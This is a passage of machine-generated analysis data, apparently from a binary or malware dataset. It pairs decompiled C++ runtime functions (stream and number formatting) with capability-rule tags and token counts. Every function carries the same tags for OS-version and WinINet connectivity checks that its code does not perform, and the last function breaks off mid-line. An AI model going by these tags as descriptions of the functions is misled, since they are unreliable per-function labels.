        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.004220e0(int32_t *param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    char cVar4;\n    uint arg_8h;\n    uint32_t arg_8h_00;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack72;\n    uint32_t var_34h;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t *var_14h;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ef00;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack72 = *0x4506f0 ^ &stack0xfffffffc;\n    puStack20 = &uStack72;\n    *in_FS_OFFSET = &var_ch_2;\n    piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_18h = 0;\n    var_2ch = param_1;\n    var_14h = param_1;\n    puVar3 = &uStack72;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))();\n        puVar3 = puStack20;\n    }\n    puStack20 = puVar3;\n    var_4h = 0;\n    if ((*(*(*param_1 + 4) + 0xc + param_1) == 0) && (*(*(*param_1 + 4) + 0x3c + param_1) != 0)) {\n        fcn.004191a0();\n    }\n    var_28h._0_1_ = *(*(*param_1 + 4) + 0xc + param_1) == 0;\n    var_4h = 1;\n    if (var_28h) {\n        arg_8h = fcn.004151b0(&var_1ch);\n        var_4h._0_1_ = 2;\n        var_24h = fcn.00421c20(arg_8h);\n        var_4h._0_1_ = 1;\n        if (var_1ch != 0) {\n            fcn.00429e0b(0);\n            iVar2 = *(var_1ch + 4);\n            if ((iVar2 != 0) && (iVar2 != -1)) {\n                *(var_1ch + 4) = iVar2 + -1;\n            }\n            iVar2 = *(var_1ch + 4);\n            fcn.00429e33();\n            puVar5 = ~-(iVar2 != 0) & var_1ch;\n            if (puVar5 != NULL) {\n                (***puVar5)(1);\n            }\n        }\n        iVar2 = *(*param_1 + 4);\n        var_20h = var_20h & 0xffffff00 | *(iVar2 + 0x40 + param_1);\n        var_34h = var_34h & 0xffffff00;\n        var_4h = CONCAT31(var_4h._1_3_, 3);\n        (**(*var_24h + 0x1c))(&var_34h, var_34h, *(iVar2 + 0x38 + param_1), *(*param_1 + 4) + param_1, var_20h, var_8h);\n        if (var_34h != '\\0') {\n            var_18h = 4;\n        }\n    }\n    var_4h = 1;\n    if (var_18h != 0) {\n        arg_8h_00 = *(param_1 + *(*param_1 + 4) + 0xc) | var_18h;\n        if (*(param_1 + *(*param_1 + 4) + 0x38) == 0) {\n            arg_8h_00 = arg_8h_00 | 4;\n        }\n        fcn.00418440(arg_8h_00, 0);\n    }\n    var_4h = 5;\n    cVar4 = fcn.0042a584();\n    if (cVar4 == '\\0') {\n        fcn.00421b60();\n    }\n    piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_4h = 0xffffffff;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return param_1;\n}\n",
        "token_count": 1140
    },
    "004222d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.004222d0(int32_t *param_1, float param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    char cVar4;\n    uint arg_8h;\n    uint32_t arg_8h_00;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack72;\n    uint32_t var_34h;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t *var_14h;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ef40;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack72 = *0x4506f0 ^ &stack0xfffffffc;\n    puStack20 = &uStack72;\n    *in_FS_OFFSET = &var_ch_2;\n    piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_18h = 0;\n    var_2ch = param_1;\n    var_14h = param_1;\n    puVar3 = &uStack72;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))();\n        puVar3 = puStack20;\n    }\n    puStack20 = puVar3;\n    var_4h = 0;\n    if ((*(*(*param_1 + 4) + 0xc + param_1) == 0) && (*(*(*param_1 + 4) + 0x3c + param_1) != 0)) {\n        fcn.004191a0();\n    }\n    var_28h._0_1_ = *(*(*param_1 + 4) + 0xc + param_1) == 0;\n    var_4h = 1;\n    if (var_28h) {\n        arg_8h = fcn.004151b0(&var_1ch);\n        var_4h._0_1_ = 2;\n        var_24h = fcn.00421c20(arg_8h);\n        var_4h._0_1_ = 1;\n        if (var_1ch != 0) {\n            fcn.00429e0b(0);\n            iVar2 = *(var_1ch + 4);\n            if ((iVar2 != 0) && (iVar2 != -1)) {\n                *(var_1ch + 4) = iVar2 + -1;\n            }\n            iVar2 = *(var_1ch + 4);\n            fcn.00429e33();\n            puVar5 = ~-(iVar2 != 0) & var_1ch;\n            if (puVar5 != NULL) {\n                (***puVar5)();\n            }\n        }\n        iVar2 = *(*param_1 + 4);\n        var_20h = var_20h & 0xffffff00 | *(iVar2 + 0x40 + param_1);\n        var_34h = var_34h & 0xffffff00;\n        var_4h = CONCAT31(var_4h._1_3_, 3);\n        (**(*var_24h + 0xc))(&var_34h, var_34h, *(iVar2 + 0x38 + param_1), *(*param_1 + 4) + param_1, var_20h, param_2);\n        if (var_34h != '\\0') {\n            var_18h = 4;\n        }\n    }\n    var_4h = 1;\n    if (var_18h != 0) {\n        arg_8h_00 = *(param_1 + *(*param_1 + 4) + 0xc) | var_18h;\n        if (*(param_1 + *(*param_1 + 4) + 0x38) == 0) {\n            arg_8h_00 = arg_8h_00 | 4;\n        }\n        fcn.00418440(arg_8h_00, 0);\n    }\n    var_4h = 5;\n    cVar4 = fcn.0042a584();\n    if (cVar4 == '\\0') {\n        fcn.00421b60();\n    }\n    piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_4h = 0xffffffff;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return param_1;\n}\n",
        "token_count": 1128
    },
    "00422610": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_84h\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00422610(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint *arg_20h, \n            int32_t arg_24h, int32_t arg_28h, int32_t arg_2ch, int32_t arg_30h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    char **ppcVar7;\n    int32_t iVar8;\n    uint *arg_8h_00;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    int32_t unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t *var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    uint32_t var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint *var_48h;\n    uint32_t var_34h;\n    uint *var_2ch;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43efa8;\n    var_ch = *in_FS_OFFSET;\n    uVar5 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_84h = arg_ch;\n    var_6ch = arg_28h;\n    var_58h = arg_24h;\n    puVar11 = &var_70h;\n    var_78h = arg_18h;\n    var_54h = arg_2ch;\n    var_4ch = arg_30h;\n    var_10h = uVar5;\n    uVar6 = fcn.004151b0(puVar11);\n    var_4h = 0;\n    var_7ch = fcn.00421fa0(uVar6);\n    uVar9 = var_70h;\n    var_4h = 0xffffffff;\n    if (var_70h != 0) {\n        uVar6 = 0;\n        var_60h = var_70h;\n        fcn.00429e0b(0);\n        iVar8 = *(uVar9 + 4);\n        if ((iVar8 != 0) && (iVar8 != -1)) {\n            *(uVar9 + 4) = iVar8 + -1;\n        }\n        iVar8 = *(uVar9 + 4);\n        fcn.00429e33(uVar6, puVar11, uVar5);\n        puVar11 = ~-(iVar8 != 0) & var_60h;\n        if (puVar11 != NULL) {\n            (***puVar11)(1);\n        }\n    }\n    piVar3 = var_7ch;\n    fcn.00421c00(&var_48h);\n    var_4h = 1;\n    uVar4 = (**(*piVar3 + 8))();\n    var_60h = var_60h & 0xffffff00 | uVar4;\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    if ((*arg_20h == '+') || (var_64h = 0,  *arg_20h == '-')) {\n        var_64h = 1;\n    }\n    ppcVar7 = fcn.0042e4f1();\n    var_5ch._0_1_ = **ppcVar7;\n    var_5ch._1_2_ = 0x65;\n    iVar8 = fcn.0042d1c0(arg_20h, 0x65, arg_30h);\n    var_50h = fcn.0042d1c0(arg_20h, var_5ch, arg_30h);\n    if (var_50h == 0) {\n        var_54h = var_50h;\n    }\n    puVar11 = var_48h;\n    if (var_34h < 0x10) {\n        puVar11 = &var_48h;\n    }\n    if (*puVar11 != '\\x7f') {\n        puVar11 = var_48h;\n        if (var_34h < 0x10) {\n            puVar11 = &var_48h;\n        }\n        if ('\\0' < *puVar11) {\n            fcn.0040bb30(arg_20h, arg_30h);\n            iVar10 = var_50h;\n            if (iVar8 == 0) {\n                fcn.0040bc50(var_54h, 0x30);\n                iVar10 = var_50h;\n            }\n            else {\n                if (var_50h == 0) {\n                    fcn.0040bc50(var_58h, 0x30);\n                    var_58h = iVar10;\n                }\n                var_80h = 0x30;\n                var_84h = var_54h;\n                fcn.00421ea0(iVar8 - arg_20h, var_54h, 0x30);\n            }\n            if (iVar10 == 0) {\n                fcn.0040bc50(var_58h, 0x30);\n            }\n            else {\n                unaff_EDI = var_6ch;\n                fcn.00421ea0((iVar10 - arg_20h) + 1, var_6ch, 0x30);\n                fcn.00421ea0(iVar10 - arg_20h, var_58h, 0x30);\n                var_6ch = 0;\n            }\n            var_58h = 0;\n            puVar11 = var_48h;\n            if (var_34h < 0x10) {\n                puVar11 = &var_48h;\n            }\n            arg_8h_00 = var_2ch;\n            if (var_18h < 0x10) {\n                arg_8h_00 = &var_2ch;\n            }\n            iVar8 = fcn.0042e520(arg_8h_00, &var_5ch);\n            cVar1 = *puVar11;\n            arg_30h = var_1ch;\n            while (((var_1ch = arg_30h,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < iVar8 - var_64h))) {\n                iVar8 = iVar8 - cVar1;\n                fcn.00421ea0(iVar8, 1, 0);\n                if ('\\0' < *(puVar11 + 1)) {\n                    puVar11 = puVar11 + 1;\n                }\n                arg_30h = var_1ch;\n                cVar1 = *puVar11;\n            }\n            arg_20h = var_2ch;\n            if (var_18h < 0x10) {\n                arg_20h = &var_2ch;\n            }\n            var_54h = 0;\n            var_4ch = arg_30h;\n        }\n    }\n    uVar9 = *(var_78h + 0x20);\n    uVar5 = var_54h + arg_30h + var_6ch + var_58h;\n    if (((*(var_78h + 0x24) < 0) || ((*(var_78h + 0x24) < 1 && (uVar9 == 0)))) || (uVar9 <= uVar5)) {\n        var_50h = 0;\n    }\n    else {\n        var_50h = uVar9 - uVar5;\n    }\n    uVar9 = *(var_78h + 0x14) & 0x1c0;\n    if (uVar9 != 0x40) {\n        if (uVar9 == 0x100) {\n            if (var_64h != 0) {\n                puVar11 = fcn.00421850(arg_8h, &var_68h, arg_10h, arg_14h, arg_20h, 1);\n                arg_10h = *puVar11;\n                arg_14h = puVar11[1];\n                arg_20h = arg_20h + 1;\n                arg_30h = arg_30h + -1;\n                var_4ch = arg_30h;\n            }\n            puVar11 = fcn.004218c0(arg_8h, &var_68h, arg_10h, arg_14h, arg_1ch, var_50h);\n            arg_10h = *puVar11;\n            arg_14h = puVar11[1];\n        }\n        else {\n            puVar11 = fcn.004218c0(arg_8h, &var_68h, arg_10h, arg_14h, arg_1ch, var_50h);\n            arg_10h = *puVar11;\n            arg_14h = puVar11[1];\n        }\n        var_50h = 0;\n    }\n    iVar8 = fcn.0042d1c0(arg_20h, var_5ch, arg_30h);\n    if (iVar8 != 0) {\n        arg_30h = (iVar8 - arg_20h) + 1;\n        puVar11 = fcn.00421930(arg_8h, &var_68h, arg_10h, arg_14h, arg_20h, iVar8 - arg_20h, var_60h);\n        puVar11 = fcn.004218c0(arg_8h, &var_68h, *puVar11, puVar11[1], 0x30, var_58h);\n        uVar6 = *puVar11;\n        uVar2 = puVar11[1];\n        uVar4 = (**(*var_7ch + 4))();\n        var_70h = var_70h & 0xffffff00 | uVar4;\n        puVar11 = fcn.004218c0(arg_8h, &var_80h, uVar6, uVar2, var_70h, 1);\n        puVar11 = fcn.004218c0(arg_8h, &var_74h, *puVar11, puVar11[1], 0x30, var_6ch);\n        arg_10h = *puVar11;\n        arg_20h = arg_20h + arg_30h;\n        arg_30h = var_4ch - arg_30h;\n        arg_14h = puVar11[1];\n        var_4ch = arg_30h;\n    }\n    iVar8 = fcn.0042d1c0(arg_20h, 0x65, arg_30h);\n    if (iVar8 != 0) {\n        arg_30h = (iVar8 - arg_20h) + 1;\n        puVar11 = fcn.00421930(arg_8h, &var_74h, arg_10h, arg_14h, arg_20h, iVar8 - arg_20h, var_60h);\n        puVar11 = fcn.004218c0(arg_8h, &var_74h, *puVar11, puVar11[1], 0x30, var_54h);\n        var_54h = 0;\n        uVar6 = 0x447afc;\n        if ((*(var_78h + 0x14) & 4) == 0) {\n            uVar6 = 0x447138;\n        }\n        puVar11 = fcn.00421850(arg_8h, &var_74h, *puVar11, puVar11[1], uVar6, 1);\n        arg_10h = *puVar11;\n        arg_20h = arg_20h + arg_30h;\n        arg_30h = var_4ch - arg_30h;\n        arg_14h = puVar11[1];\n        var_4ch = arg_30h;\n    }\n    puVar11 = fcn.00421930(arg_8h, &var_74h, arg_10h, arg_14h, arg_20h, arg_30h, var_60h);\n    puVar11 = fcn.004218c0(arg_8h, &var_80h, *puVar11, puVar11[1], 0x30, var_54h);\n    uVar6 = *puVar11;\n    uVar2 = puVar11[1];\n    *(var_78h + 0x20) = 0;\n    *(var_78h + 0x24) = 0;\n    fcn.004218c0(arg_8h, var_84h, uVar6, uVar2, arg_1ch, var_50h);\n    if (0xf < var_18h) {\n        fcn.0042a679(var_2ch);\n    }\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    if (0xf < var_34h) {\n        fcn.0042a679(var_48h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(unaff_EDI);\n    return;\n}\n",
        "token_count": 3219
    },
    "00422b80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00422b80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, char *arg_20h, \n            uint32_t arg_24h)\n\n{\n    char cVar1;\n    uint arg_14h_00;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint unaff_EDI;\n    uint *puVar7;\n    int32_t *in_FS_OFFSET;\n    uint var_54h;\n    int32_t *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint *var_44h;\n    uint32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    uint *var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43efe0;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4ch = arg_ch;\n    puVar7 = &var_40h;\n    var_3ch = arg_18h;\n    var_30h = arg_24h;\n    var_10h = uVar3;\n    uVar4 = fcn.004151b0(puVar7);\n    var_4h = 0;\n    var_50h = fcn.00421fa0(uVar4);\n    uVar6 = var_40h;\n    var_4h = 0xffffffff;\n    if (var_40h != 0) {\n        uVar4 = 0;\n        fcn.00429e0b(0);\n        iVar5 = *(uVar6 + 4);\n        if ((iVar5 != 0) && (iVar5 != -1)) {\n            *(uVar6 + 4) = iVar5 + -1;\n        }\n        iVar5 = *(uVar6 + 4);\n        fcn.00429e33(uVar4, puVar7, uVar3);\n        puVar7 = ~-(iVar5 != 0) & uVar6;\n        if (puVar7 != NULL) {\n            (***puVar7)(1);\n        }\n    }\n    fcn.00421c00(&var_2ch);\n    cVar1 = *arg_20h;\n    var_4h = 1;\n    if ((cVar1 == '+') || (cVar1 == '-')) {\n        var_34h = 1;\n    }\n    else if ((cVar1 == '0') && ((arg_20h[1] == 'x' || (arg_20h[1] == 'X')))) {\n        var_34h = 2;\n    }\n    else {\n        var_34h = 0;\n    }\n    puVar7 = var_2ch;\n    if (var_18h < 0x10) {\n        puVar7 = &var_2ch;\n    }\n    if (*puVar7 != '\\x7f') {\n        puVar7 = var_2ch;\n        if (var_18h < 0x10) {\n            puVar7 = &var_2ch;\n        }\n        if ('\\0' < *puVar7) {\n            var_44h = var_2ch;\n            if (var_18h < 0x10) {\n                var_44h = &var_2ch;\n            }\n            cVar1 = *var_44h;\n            uVar6 = var_30h;\n            while (((cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar6 - var_34h))) {\n                uVar6 = uVar6 - cVar1;\n                iVar5 = (var_30h - uVar6) + 1;\n                fcn.0042e566(arg_20h + uVar6 + 1, iVar5, arg_20h + uVar6, iVar5);\n                var_30h = var_30h + 1;\n                arg_20h[uVar6] = '\\0';\n                if ('\\0' < *(var_44h + 1)) {\n                    var_44h = var_44h + 1;\n                }\n                cVar1 = *var_44h;\n            }\n        }\n    }\n    uVar6 = *(var_3ch + 0x20);\n    if (((*(var_3ch + 0x24) < 0) || ((*(var_3ch + 0x24) < 1 && (uVar6 == 0)))) || (uVar6 <= var_30h)) {\n        iVar5 = 0;\n    }\n    else {\n        iVar5 = uVar6 - var_30h;\n    }\n    uVar6 = *(var_3ch + 0x14) & 0x1c0;\n    if (uVar6 != 0x40) {\n        if (uVar6 == 0x100) {\n            puVar7 = fcn.00421850(arg_8h, &var_48h, arg_10h, arg_14h, arg_20h, var_34h);\n            var_30h = var_30h - var_34h;\n            arg_20h = arg_20h + var_34h;\n            puVar7 = fcn.004218c0(arg_8h, &var_38h, *puVar7, puVar7[1], arg_1ch, iVar5);\n            arg_10h = *puVar7;\n            arg_14h = puVar7[1];\n        }\n        else {\n            puVar7 = fcn.004218c0(arg_8h, &var_38h, arg_10h, arg_14h, arg_1ch, iVar5);\n            arg_10h = *puVar7;\n            arg_14h = puVar7[1];\n        }\n        iVar5 = 0;\n    }\n    uVar2 = (**(*var_50h + 8))();\n    var_40h = var_40h & 0xffffff00 | uVar2;\n    puVar7 = fcn.00421930(arg_8h, &var_54h, arg_10h, arg_14h, arg_20h, var_30h, var_40h);\n    uVar4 = *puVar7;\n    arg_14h_00 = puVar7[1];\n    *(var_3ch + 0x20) = 0;\n    *(var_3ch + 0x24) = 0;\n    fcn.004218c0(arg_8h, var_4ch, uVar4, arg_14h_00, arg_1ch, iVar5);\n    if (0xf < var_18h) {\n        fcn.0042a679(var_2ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(unaff_EDI);\n    return;\n}\n",
        "token_count": 1659
    },
    "00422f10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00422f10(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint32_t arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint arg_14h_00;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    int32_t *in_ECX;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint32_t var_34h;\n    uint *var_2ch;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f080;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_54h = arg_8h;\n    var_4ch = var_4ch & 0xffffff00 | arg_18h & 0xff;\n    var_10h = arg_8h_00;\n    if ((*(arg_14h + 0x14) & 0x4000) == 0) {\n        (**(*in_ECX + 0x1c))(arg_8h, arg_ch, arg_10h, arg_14h, var_4ch, arg_1ch);\n    }\n    else {\n        uVar2 = fcn.004151b0(&var_58h);\n        var_4h = 0;\n        var_5ch = fcn.00421fa0(uVar2);\n        var_4h = 0xffffffff;\n        if (var_58h != 0) {\n            var_50h = var_58h;\n            fcn.00429e0b(0);\n            iVar4 = *(var_58h + 4);\n            if ((iVar4 != 0) && (iVar4 != -1)) {\n                *(var_58h + 4) = iVar4 + -1;\n            }\n            iVar4 = *(var_58h + 4);\n            fcn.00429e33();\n            puVar3 = ~-(iVar4 != 0) & var_50h;\n            if (puVar3 != NULL) {\n                (***puVar3)(1);\n            }\n        }\n        var_18h = 0xf;\n        var_1ch = 0;\n        var_2ch = var_2ch & 0xffffff00;\n        var_4h = 1;\n        if (arg_1ch == '\\0') {\n            uVar2 = fcn.00421bc0(&var_48h);\n            var_4h._0_1_ = 3;\n            fcn.004063e0(uVar2);\n        }\n        else {\n            uVar2 = fcn.00421be0(&var_48h);\n            var_4h._0_1_ = 2;\n            fcn.004063e0(uVar2);\n        }\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        if (0xf < var_34h) {\n            fcn.0042a679(var_48h);\n        }\n        uVar1 = *(arg_14h + 0x20);\n        if ((*(arg_14h + 0x24) < 0) || (((*(arg_14h + 0x24) < 1 && (uVar1 == 0)) || (uVar1 <= var_1ch)))) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = uVar1 - var_1ch;\n        }\n        if ((*(arg_14h + 0x14) & 0x1c0) != 0x40) {\n            puVar3 = fcn.004218c0(in_ECX, &var_68h, arg_ch, arg_10h, var_4ch, iVar4);\n            arg_ch = *puVar3;\n            arg_10h = puVar3[1];\n            iVar4 = 0;\n        }\n        puVar3 = var_2ch;\n        if (var_18h < 0x10) {\n            puVar3 = &var_2ch;\n        }\n        puVar3 = fcn.00421850(in_ECX, &var_60h, arg_ch, arg_10h, puVar3, var_1ch);\n        uVar2 = *puVar3;\n        arg_14h_00 = puVar3[1];\n        *(arg_14h + 0x20) = 0;\n        *(arg_14h + 0x24) = 0;\n        fcn.004218c0(in_ECX, var_54h, uVar2, arg_14h_00, var_4ch, iVar4);\n        if (0xf < var_18h) {\n            fcn.0042a679(var_2ch);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1265
    },
    "00423e00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00423e00(uint *arg_8h, uint32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_00;\n    int32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f192;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_14h != 0) {\n        *in_ECX = 0x447a38;\n        in_ECX[0x1a] = 0x4477c8;\n        var_4h = 0;\n    }\n    *(in_ECX + *(*in_ECX + 4)) = 0x4477c0;\n    in_ECX[2] = 0;\n    in_ECX[3] = 0;\n    iVar3 = *(*in_ECX + 4);\n    fcn.00418570(uVar2);\n    *(in_ECX + iVar3 + 0x38) = in_ECX + 4;\n    *(in_ECX + iVar3 + 0x3c) = 0;\n    uVar1 = fcn.00419580(0x20);\n    *(in_ECX + iVar3 + 0x40) = uVar1;\n    if (*(in_ECX + iVar3 + 0x38) == 0) {\n        fcn.00418440(*(in_ECX + iVar3 + 0xc) | 4, 0);\n    }\n    var_4h = 2;\n    *(in_ECX + *(*in_ECX + 4)) = 0x447a34;\n    fcn.00418ec0();\n    in_ECX[4] = 0x4478dc;\n    *(in_ECX + 0x18) = 0;\n    *(in_ECX + 0x59) = 0;\n    in_ECX[8] = in_ECX + 6;\n    in_ECX[0xc] = in_ECX + 10;\n    in_ECX[0xd] = in_ECX + 0xb;\n    in_ECX[9] = in_ECX + 7;\n    in_ECX[0x10] = in_ECX + 0xe;\n    in_ECX[0x11] = in_ECX + 0xf;\n    in_ECX[7] = 0;\n    *in_ECX[0xd] = 0;\n    *in_ECX[0x11] = 0;\n    *in_ECX[8] = 0;\n    *in_ECX[0xc] = 0;\n    *in_ECX[0x10] = 0;\n    in_ECX[0x19] = 0;\n    in_ECX[0x17] = *0x4625e0;\n    in_ECX[0x15] = 0;\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    if (0xf < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    iVar3 = fcn.004197b0(arg_8h, arg_ch | 1, arg_10h);\n    if (iVar3 == 0) {\n        uVar2 = *(*(*in_ECX + 4) + 0xc + in_ECX);\n        arg_8h_00 = uVar2 | 2;\n        if (*(in_ECX + *(*in_ECX + 4) + 0x38) == 0) {\n            arg_8h_00 = uVar2 | 6;\n        }\n        fcn.00418440(arg_8h_00, 0);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 944
    },
    "004258e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004258e0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int16_t *piVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint16_t *puVar16;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar8 = arg_8h;\n    iVar10 = arg_ch[2];\n    iVar3 = arg_ch[3];\n    iVar4 = arg_ch[6];\n    iVar5 = arg_ch[1];\n    iVar14 = arg_ch[5];\n    iVar6 = *arg_ch;\n    *(arg_8h + 0xfe4) = 0;\n    *(arg_8h + 0xfe8) = 0;\n    *(arg_8h + 0xfec) = 0;\n    *(arg_8h + 0xff0) = 0;\n    *(arg_8h + 0xff4) = 0;\n    *(arg_8h + 0xff8) = 0;\n    *(arg_8h + 0xffc) = 0;\n    *(arg_8h + 0x1000) = 0;\n    *(iVar6 + 2 + *(arg_8h + 0x1004 + *(arg_8h + 0x18fc) * 4) * 4) = 0;\n    iVar12 = 0;\n    var_8h 